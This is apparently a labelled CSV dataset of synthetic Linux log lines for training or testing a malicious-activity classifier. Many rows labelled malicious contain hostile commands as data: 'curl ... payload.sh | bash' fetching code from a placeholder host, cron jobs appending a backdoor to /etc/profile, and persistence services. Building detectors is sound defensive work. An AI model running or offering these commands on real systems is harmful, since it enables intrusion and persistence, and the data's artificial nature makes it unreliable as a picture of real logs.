id,log_text,label
4484,kernel: [ 5403.89 ] USB device plugged,normal
4485,sshd[2851]: Failed password for invalid user admin from 5.188.247.137 port 22 ssh2,malicious
4486,bash[1155]: curl http://malicious.example/payload.sh | bash,malicious
4487,CRON[2841]: (root) CMD (pwd),normal
4488,bash[5145]: curl http://malicious.example/payload.sh | bash,malicious
4489,systemd[1]: Started Session 8177 of user root.,normal
4490,bash[5461]: curl http://malicious.example/payload.sh | bash,malicious
4491,sshd[5883]: Accepted publickey for user from 192.168.253.65 port 22 ssh2,normal
4492,systemd[1]: Started Session 7148 of user root.,normal
4493,networkd: DHCPv4 address assigned to eth0,normal
4494,systemd[1]: Created malicious service persistence_2509.service,malicious
4495,bash[9583]: curl http://malicious.example/payload.sh | bash,malicious
4496,kernel: [ 8365.27 ] USB device plugged,normal
4497,kernel: [ 8664.06 ] USB device plugged,normal
4498,bash[1296]: curl http://malicious.example/payload.sh | bash,malicious
4499,CRON[8140]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4500,sshd[9060]: Failed password for invalid user admin from 5.188.28.160 port 22 ssh2,malicious
4501,CRON[1715]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4502,CRON[9929]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4503,networkd: DHCPv4 address assigned to eth0,normal
4504,kernel: [ 7529.2 ] USB device plugged,normal
4505,bash[9056]: curl http://malicious.example/payload.sh | bash,malicious
4506,networkd: DHCPv4 address assigned to eth0,normal
4507,bash[6017]: curl http://malicious.example/payload.sh | bash,malicious
4508,kernel: [ 8262.76 ] Module loaded: suspicious_mod,malicious
4509,kernel: [ 6259.5 ] Module loaded: suspicious_mod,malicious
4510,sshd[2277]: Accepted publickey for user from 192.168.23.206 port 22 ssh2,normal
4511,bash[8408]: curl http://malicious.example/payload.sh | bash,malicious
4512,bash[8563]: curl http://malicious.example/payload.sh | bash,malicious
4513,sshd[4511]: Accepted publickey for user from 192.168.24.19 port 22 ssh2,normal
4514,kernel: [ 7458.72 ] Module loaded: suspicious_mod,malicious
4515,sshd[6703]: Accepted publickey for user from 192.168.134.23 port 22 ssh2,normal
4516,systemd[1]: Created malicious service persistence_4287.service,malicious
4517,networkd: DHCPv4 address assigned to eth0,normal
4518,CRON[3658]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4519,sshd[5369]: Failed password for invalid user admin from 5.188.100.245 port 22 ssh2,malicious
4520,bash[9765]: curl http://malicious.example/payload.sh | bash,malicious
4521,CRON[7788]: (root) CMD (uptime),normal
4522,kernel: [ 2103.72 ] USB device plugged,normal
4523,bash[6634]: curl http://malicious.example/payload.sh | bash,malicious
4524,kernel: [ 5258.36 ] USB device plugged,normal
4525,kernel: [ 1607.91 ] Module loaded: suspicious_mod,malicious
4526,systemd[1]: Started Session 1736 of user root.,normal
4527,systemd[1]: Created malicious service persistence_4363.service,malicious
4528,CRON[6006]: (root) CMD (pwd),normal
4529,sshd[4323]: Accepted publickey for user from 192.168.143.168 port 22 ssh2,normal
4530,systemd[1]: Started Session 5495 of user root.,normal
4531,kernel: [ 1131.39 ] Module loaded: suspicious_mod,malicious
4532,sshd[4531]: Accepted publickey for user from 192.168.105.39 port 22 ssh2,normal
4533,CRON[3767]: (root) CMD (whoami),normal
4534,systemd[1]: Created malicious service persistence_7976.service,malicious
4535,CRON[9409]: (root) CMD (whoami),normal
4536,CRON[7056]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4537,CRON[9086]: (root) CMD (ls),normal
4538,sshd[4694]: Failed password for invalid user admin from 5.188.202.221 port 22 ssh2,malicious
4539,kernel: [ 8012.01 ] Module loaded: suspicious_mod,malicious
4540,kernel: [ 5748.77 ] USB device plugged,normal
4541,kernel: [ 9945.59 ] USB device plugged,normal
4542,networkd: DHCPv4 address assigned to eth0,normal
4543,systemd[1]: Started Session 4887 of user root.,normal
4544,kernel: [ 8113.46 ] Module loaded: suspicious_mod,malicious
4545,systemd[1]: Started Session 8781 of user root.,normal
4546,CRON[7118]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4547,sshd[1944]: Failed password for invalid user admin from 5.188.122.14 port 22 ssh2,malicious
4548,bash[9841]: curl http://malicious.example/payload.sh | bash,malicious
4549,kernel: [ 9885.39 ] Module loaded: suspicious_mod,malicious
4550,kernel: [ 1909.23 ] USB device plugged,normal
4551,systemd[1]: Created malicious service persistence_7336.service,malicious
4552,sshd[9356]: Failed password for invalid user admin from 5.188.186.215 port 22 ssh2,malicious
4553,bash[8985]: curl http://malicious.example/payload.sh | bash,malicious
4554,kernel: [ 5276.92 ] USB device plugged,normal
4555,sshd[2882]: Failed password for invalid user admin from 5.188.172.252 port 22 ssh2,malicious
4556,systemd[1]: Started Session 9321 of user root.,normal
4557,CRON[9894]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4558,systemd[1]: Started Session 8512 of user root.,normal
4559,bash[7785]: curl http://malicious.example/payload.sh | bash,malicious
4560,sshd[1884]: Accepted publickey for user from 192.168.65.183 port 22 ssh2,normal
4561,systemd[1]: Created malicious service persistence_6985.service,malicious
4562,CRON[5838]: (root) CMD (whoami),normal
4563,systemd[1]: Created malicious service persistence_2065.service,malicious
4564,networkd: DHCPv4 address assigned to eth0,normal
4565,CRON[9037]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4566,systemd[1]: Created malicious service persistence_5074.service,malicious
4567,CRON[6488]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4568,CRON[4241]: (root) CMD (pwd),normal
4569,systemd[1]: Started Session 6397 of user root.,normal
4570,networkd: DHCPv4 address assigned to eth0,normal
4571,sshd[9344]: Failed password for invalid user admin from 5.188.15.94 port 22 ssh2,malicious
4572,CRON[8826]: (root) CMD (whoami),normal
4573,systemd[1]: Started Session 3118 of user root.,normal
4574,networkd: DHCPv4 address assigned to eth0,normal
4575,systemd[1]: Started Session 3865 of user root.,normal
4576,systemd[1]: Started Session 4698 of user root.,normal
4577,bash[8023]: curl http://malicious.example/payload.sh | bash,malicious
4578,CRON[7764]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4579,systemd[1]: Created malicious service persistence_4975.service,malicious
4580,kernel: [ 5517.57 ] USB device plugged,normal
4581,sshd[8475]: Accepted publickey for user from 192.168.217.79 port 22 ssh2,normal
4582,networkd: DHCPv4 address assigned to eth0,normal
4583,CRON[6867]: (root) CMD (whoami),normal
4584,bash[1417]: curl http://malicious.example/payload.sh | bash,malicious
4585,sshd[2136]: Failed password for invalid user admin from 5.188.240.19 port 22 ssh2,malicious
4586,systemd[1]: Created malicious service persistence_8766.service,malicious
4587,systemd[1]: Started Session 8406 of user root.,normal
4588,CRON[3626]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4589,kernel: [ 8111.66 ] Module loaded: suspicious_mod,malicious
4590,systemd[1]: Started Session 3326 of user root.,normal
4591,sshd[1685]: Accepted publickey for user from 192.168.129.5 port 22 ssh2,normal
4592,systemd[1]: Created malicious service persistence_7575.service,malicious
4593,kernel: [ 6487.43 ] Module loaded: suspicious_mod,malicious
4594,bash[2149]: curl http://malicious.example/payload.sh | bash,malicious
4595,sshd[7955]: Accepted publickey for user from 192.168.13.139 port 22 ssh2,normal
4596,networkd: DHCPv4 address assigned to eth0,normal
4597,systemd[1]: Created malicious service persistence_2119.service,malicious
4598,networkd: DHCPv4 address assigned to eth0,normal
4599,systemd[1]: Started Session 9112 of user root.,normal
4600,systemd[1]: Created malicious service persistence_4190.service,malicious
4601,sshd[1781]: Accepted publickey for user from 192.168.92.205 port 22 ssh2,normal
4602,bash[2845]: curl http://malicious.example/payload.sh | bash,malicious
4603,systemd[1]: Started Session 9866 of user root.,normal
4604,bash[9783]: curl http://malicious.example/payload.sh | bash,malicious
4605,kernel: [ 9078.32 ] Module loaded: suspicious_mod,malicious
4606,systemd[1]: Started Session 8452 of user root.,normal
4607,kernel: [ 7869.49 ] USB device plugged,normal
4608,bash[3752]: curl http://malicious.example/payload.sh | bash,malicious
4609,sshd[8975]: Accepted publickey for user from 192.168.239.2 port 22 ssh2,normal
4610,systemd[1]: Started Session 5776 of user root.,normal
4611,kernel: [ 4674.01 ] USB device plugged,normal
4612,networkd: DHCPv4 address assigned to eth0,normal
4613,bash[9493]: curl http://malicious.example/payload.sh | bash,malicious
4614,sshd[8077]: Accepted publickey for user from 192.168.22.98 port 22 ssh2,normal
4615,CRON[7978]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4616,systemd[1]: Created malicious service persistence_7819.service,malicious
4617,networkd: DHCPv4 address assigned to eth0,normal
4618,networkd: DHCPv4 address assigned to eth0,normal
4619,CRON[7023]: (root) CMD (uptime),normal
4620,systemd[1]: Created malicious service persistence_4331.service,malicious
4621,systemd[1]: Created malicious service persistence_5540.service,malicious
4622,bash[1385]: curl http://malicious.example/payload.sh | bash,malicious
4623,bash[4741]: curl http://malicious.example/payload.sh | bash,malicious
4624,networkd: DHCPv4 address assigned to eth0,normal
4625,systemd[1]: Created malicious service persistence_9640.service,malicious
4626,CRON[2199]: (root) CMD (uptime),normal
4627,systemd[1]: Started Session 7261 of user root.,normal
4628,systemd[1]: Started Session 3277 of user root.,normal
4629,CRON[6652]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4630,bash[4416]: curl http://malicious.example/payload.sh | bash,malicious
4631,sshd[6725]: Failed password for invalid user admin from 5.188.222.173 port 22 ssh2,malicious
4632,sshd[1944]: Failed password for invalid user admin from 5.188.244.53 port 22 ssh2,malicious
4633,networkd: DHCPv4 address assigned to eth0,normal
4634,systemd[1]: Created malicious service persistence_2724.service,malicious
4635,sshd[6017]: Accepted publickey for user from 192.168.17.51 port 22 ssh2,normal
4636,sshd[9363]: Accepted publickey for user from 192.168.28.212 port 22 ssh2,normal
4637,systemd[1]: Started Session 7947 of user root.,normal
4638,kernel: [ 1744.49 ] Module loaded: suspicious_mod,malicious
4639,kernel: [ 5243.86 ] Module loaded: suspicious_mod,malicious
4640,kernel: [ 1372.17 ] USB device plugged,normal
4641,systemd[1]: Created malicious service persistence_4486.service,malicious
4642,sshd[7736]: Accepted publickey for user from 192.168.117.192 port 22 ssh2,normal
4643,bash[9154]: curl http://malicious.example/payload.sh | bash,malicious
4644,bash[2003]: curl http://malicious.example/payload.sh | bash,malicious
4645,CRON[6858]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4646,networkd: DHCPv4 address assigned to eth0,normal
4647,sshd[7752]: Failed password for invalid user admin from 5.188.113.142 port 22 ssh2,malicious
4648,systemd[1]: Created malicious service persistence_5008.service,malicious
4649,sshd[3185]: Accepted publickey for user from 192.168.255.157 port 22 ssh2,normal
4650,CRON[5979]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4651,CRON[4214]: (root) CMD (pwd),normal
4652,sshd[6712]: Failed password for invalid user admin from 5.188.32.203 port 22 ssh2,malicious
4653,systemd[1]: Started Session 6998 of user root.,normal
4654,systemd[1]: Started Session 4124 of user root.,normal
4655,bash[4865]: curl http://malicious.example/payload.sh | bash,malicious
4656,CRON[1495]: (root) CMD (ls),normal
4657,bash[2481]: curl http://malicious.example/payload.sh | bash,malicious
4658,kernel: [ 9444.59 ] Module loaded: suspicious_mod,malicious
4659,systemd[1]: Created malicious service persistence_5983.service,malicious
4660,sshd[5433]: Failed password for invalid user admin from 5.188.140.143 port 22 ssh2,malicious
4661,kernel: [ 284.39 ] USB device plugged,normal
4662,systemd[1]: Created malicious service persistence_6027.service,malicious
4663,sshd[2568]: Failed password for invalid user admin from 5.188.230.17 port 22 ssh2,malicious
4664,kernel: [ 4837.46 ] Module loaded: suspicious_mod,malicious
4665,CRON[3240]: (root) CMD (pwd),normal
4666,networkd: DHCPv4 address assigned to eth0,normal
4667,kernel: [ 9597.1 ] Module loaded: suspicious_mod,malicious
4668,sshd[9106]: Failed password for invalid user admin from 5.188.73.236 port 22 ssh2,malicious
4669,sshd[6786]: Failed password for invalid user admin from 5.188.14.35 port 22 ssh2,malicious
4670,systemd[1]: Started Session 6156 of user root.,normal
4671,CRON[2475]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4672,bash[7240]: curl http://malicious.example/payload.sh | bash,malicious
4673,bash[8674]: curl http://malicious.example/payload.sh | bash,malicious
4674,systemd[1]: Started Session 2244 of user root.,normal
4675,CRON[4019]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4676,systemd[1]: Created malicious service persistence_6954.service,malicious
4677,CRON[5568]: (root) CMD (whoami),normal
4678,sshd[3893]: Failed password for invalid user admin from 5.188.55.104 port 22 ssh2,malicious
4679,networkd: DHCPv4 address assigned to eth0,normal
4680,networkd: DHCPv4 address assigned to eth0,normal
4681,bash[8446]: curl http://malicious.example/payload.sh | bash,malicious
4682,kernel: [ 9024.05 ] USB device plugged,normal
4683,networkd: DHCPv4 address assigned to eth0,normal
4684,sshd[9293]: Failed password for invalid user admin from 5.188.104.74 port 22 ssh2,malicious
4685,bash[9058]: curl http://malicious.example/payload.sh | bash,malicious
4686,sshd[2138]: Accepted publickey for user from 192.168.241.17 port 22 ssh2,normal
4687,bash[2897]: curl http://malicious.example/payload.sh | bash,malicious
4688,CRON[9976]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4689,systemd[1]: Created malicious service persistence_9801.service,malicious
4690,kernel: [ 4458.0 ] Module loaded: suspicious_mod,malicious
4691,systemd[1]: Started Session 2691 of user root.,normal
4692,sshd[5170]: Failed password for invalid user admin from 5.188.12.66 port 22 ssh2,malicious
4693,systemd[1]: Started Session 2105 of user root.,normal
4694,kernel: [ 8679.27 ] Module loaded: suspicious_mod,malicious
4695,systemd[1]: Started Session 5730 of user root.,normal
4696,sshd[7161]: Failed password for invalid user admin from 5.188.215.129 port 22 ssh2,malicious
4697,sshd[4744]: Failed password for invalid user admin from 5.188.40.8 port 22 ssh2,malicious
4698,systemd[1]: Started Session 6978 of user root.,normal
4699,CRON[8970]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4700,kernel: [ 3804.78 ] Module loaded: suspicious_mod,malicious
4701,bash[5535]: curl http://malicious.example/payload.sh | bash,malicious
4702,networkd: DHCPv4 address assigned to eth0,normal
4703,CRON[2159]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4704,sshd[1276]: Accepted publickey for user from 192.168.102.3 port 22 ssh2,normal
4705,systemd[1]: Started Session 3208 of user root.,normal
4706,kernel: [ 2097.47 ] USB device plugged,normal
4707,systemd[1]: Started Session 5306 of user root.,normal
4708,systemd[1]: Created malicious service persistence_4904.service,malicious
4709,kernel: [ 2196.44 ] Module loaded: suspicious_mod,malicious
4710,sshd[8114]: Failed password for invalid user admin from 5.188.124.196 port 22 ssh2,malicious
4711,sshd[6123]: Failed password for invalid user admin from 5.188.126.207 port 22 ssh2,malicious
4712,CRON[9561]: (root) CMD (whoami),normal
4713,kernel: [ 4269.96 ] Module loaded: suspicious_mod,malicious
4714,systemd[1]: Started Session 8737 of user root.,normal
4715,CRON[3543]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4716,systemd[1]: Started Session 4222 of user root.,normal
4717,CRON[2554]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4718,kernel: [ 7525.01 ] Module loaded: suspicious_mod,malicious
